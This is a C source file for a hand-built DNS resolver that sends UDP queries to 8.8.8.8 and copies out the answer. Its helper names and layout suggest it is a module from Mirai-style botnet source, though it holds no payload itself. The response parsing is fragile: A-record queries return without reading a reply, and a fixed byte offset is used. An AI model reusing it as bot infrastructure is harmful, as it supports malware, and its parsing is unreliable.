#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "headers/resolve.h"
#include "headers/includes.h"
#include "headers/utils.h"
#include "headers/rand.h"

void domain_to_name(char *dns, char *domain, int len)
{
    int l = len + 1;
    int pos = 0;
    char *m = dns;
    char *p = dns + 1;

    while(l--)
    {
        char tmp = *domain++;
        if(tmp == '.' || tmp == 0)
        {
            *m = pos;
            m = p++;
            pos = 0;
            continue;
        }
        pos++;
        *p++ = tmp;
    }

    return;
}

struct resolve *dns_lookup(char *domain, uint8_t type)
{
    char query[2048] = {0};
    char response[2048] = {0};
    struct dnshdr *dns_header = (struct dnshdr *)query;
    char *query_name = (char *)(dns_header + 1);
    int domain_len = util_strlen(domain);
    struct sockaddr_in dest_addr;
    uint16_t id = rand_new() % 0xffff;
    struct dns_question *dns_q;
    int fd = -1;
    int tries = 0;
    int query_len = 0;
    struct resolve *ptr = (struct resolve *)calloc(1, sizeof(struct resolve));
    struct dns_resource *data;
    char *r;

    domain_to_name(query_name, domain, domain_len);

    dns_q = (struct dns_question *)(query_name + util_strlen(query_name) + 1);
    query_len = sizeof(struct dnshdr) + util_strlen(query_name) + 1 + sizeof(struct dns_question);

    dest_addr.sin_family = AF_INET;
    //dest_addr.sin_addr.s_addr = get_random_dns_resolver();
    dest_addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    dest_addr.sin_port = htons(53);

    #ifdef DEBUG
    printf("Using DNS resolver %d.%d.%d.%d\n", dest_addr.sin_addr.s_addr & 0xff, (dest_addr.sin_addr.s_addr >> 8) & 0xff, (dest_addr.sin_addr.s_addr >> 16) & 0xff, (dest_addr.sin_addr.s_addr >> 24) & 0xff);
    #endif

    dns_header->id = id;
    dns_header->options = htons(1 << 8);
    dns_header->qd_count = htons(1);

    dns_q->query_type = htons(type);
    dns_q->query_class = htons(QUERY_CLASS_IP);

    while((tries++) != MAX_DNS_QUERY_TRIES)
    {
        fd_set read_set;
        struct timeval timeout;
        int ret = 0;

        if((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            close(fd);
            sleep(1);
            continue;
        }

        if(connect(fd, (struct sockaddr_in *)&dest_addr, sizeof(dest_addr)) == -1)
        {
            close(fd);
            sleep(1);
            continue;
        }

        if(send(fd, query, query_len, MSG_NOSIGNAL) != query_len)
        {
            close(fd);
            sleep(1);
            continue;
        }

        // Put the socket into non-blocking mode for select
        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
        
        FD_ZERO(&read_set);
        FD_SET(fd, &read_set);

        timeout.tv_sec = 10;
        timeout.tv_usec = 0;

        ret = select(fd + 1, &read_set, NULL, NULL, &timeout);
        if(ret == -1)
        {
            #ifdef DEBUG
            printf("Select failed\n");
            #endif
            continue;
        }
        else if(ret == 0)
        {
            #ifdef DEBUG
            printf("Select timed out\n");
            #endif
            continue;
        }

        if(type == QUERY_TYPE_A)
        {
            break;
        }

        if(fd != -1 && FD_ISSET(fd, &read_set))
        {
            #ifdef DEBUG
            //printf("Got response from select\n");
            #endif
            ret = recvfrom(fd, response, sizeof(response), MSG_NOSIGNAL, NULL, NULL);
            if(ret < (sizeof(struct dnshdr) + util_strlen(query_name) + 1 + sizeof(struct dns_question)))
                continue;

            dns_header = (struct dnshdr *)response;
            query_name = (char *)(dns_header + 1);
            dns_q = (struct dns_question *)(query_name + util_strlen(query_name) + 1);
            r = (char *)(dns_q + 1);

            if(dns_header->id != id)
                continue;
            // No result?
            if(ntohs(dns_header->answer_count) < 1)
                continue;

            // Jump forward 3 bytes in the packet to the data response.
            r = r + 3;

            data = (struct dns_resource *)r;
            util_memcpy(ptr->buf, data->buf, util_strlen(data->buf));
            ptr->data_len = util_strlen(data->buf);
            break;
        }
    }

    close(fd);

    if(tries == (MAX_DNS_QUERY_TRIES + 1))
        return NULL;

    return ptr;
}
